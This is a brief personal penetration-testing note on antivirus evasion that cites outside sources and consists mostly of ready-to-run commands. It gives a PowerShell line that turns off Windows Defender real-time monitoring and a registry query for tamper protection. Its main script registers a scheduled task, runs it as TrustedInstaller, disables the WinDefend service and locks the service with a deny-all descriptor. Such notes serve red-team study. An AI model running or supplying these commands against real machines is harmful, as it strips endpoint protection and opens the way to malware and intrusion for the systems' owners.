# Antivirus evasion
[https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/](https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/) 

To disable defender, use:

```text-plain
Set-MpPreference -DisableRealtimeMonitoring $true
```

We could probably quit here and get a lot of mileage out of this script, but as my daughter would say after reading the disclaimer on hand sanitizer, “Why don’t they just put a little bit more in and kill ‘em all!?” 

```text-plain
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection
```

This repo shows us a way around:  
[https://gist.github.com/tyranid/c65520160b61ec851e68811de3cd646d](https://gist.github.com/tyranid/c65520160b61ec851e68811de3cd646d) 

```text-plain
$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'

$a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline
Register-ScheduledTask -TaskName 'TestTask' -Action $a

$svc = New-Object -ComObject 'Schedule.Service'
$svc.Connect()

$user = 'NT SERVICE\TrustedInstaller'
$folder = $svc.GetFolder('\')
$task = $folder.GetTask('TestTask')
$task.RunEx($null, 0, 0, $user)
```

![](Antivirus%20evasion/image.jpg)